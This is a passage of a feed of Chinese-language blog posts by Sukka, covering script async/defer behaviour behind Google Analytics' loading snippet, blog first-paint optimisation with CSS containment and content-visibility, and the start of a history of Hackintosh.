DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img 